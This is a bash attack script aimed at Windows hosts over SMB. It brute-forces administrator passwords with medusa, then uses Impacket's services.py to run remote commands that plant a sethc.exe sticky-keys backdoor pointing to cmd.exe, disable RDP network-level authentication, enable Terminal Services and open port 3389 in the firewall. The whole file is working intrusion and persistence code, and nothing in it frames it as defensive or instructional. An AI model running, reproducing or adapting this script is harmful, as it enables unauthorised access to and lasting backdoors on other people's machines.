#!/bin/bash

WAIT=2
DPORT=445

function pwn(){
	echo "[*] try to activate backdoor"

	target="$1"
	user="$2"
	password="$3"

	services.py "$user:$password@$target" create -name 1 -display 1 -path 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null
	services.py "$user:$password@$target" create -name 1 -display 1 -path 'reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null

	services.py "$user:$password@$target" create -name 1 -display 1 -path 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null
	services.py "$user:$password@$target" create -name 1 -display 1 -path 'net start TermService' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null

	services.py "$user:$password@$target" create -name 1 -display 1 -path 'netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null
	services.py "$user:$password@$target" create -name 1 -display 1 -path 'netsh.exe firewall add portopening TCP 3389 "Remote Desktop"' > /dev/null
	services.py "$user:$password@$target" start -name 1 > /dev/null
	services.py "$user:$password@$target" delete -name 1 > /dev/null
}
#sleep 30
if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] bruteforcing smb'
	for user in администратор administrator admin; do
		found=$(medusa -M smbnt -m PASS:PASSWORD -h $1 -u $user -P on_client/bruteforce/default_pass_for_services_unhash.txt | grep 'SUCCESS (ADMIN$ - Access Allowed)')
		if [ x"$found" != "x" ]; then
			led red on 2> /dev/null
			echo $found | grep 'SUCCESS' --color=auto
			password=$(echo $found|sed -rn 's/.*Password: (.*) \[SUCCESS.*/\1/p')
			pwn "$1" "$user" "$password"
			break
		fi
	done
fi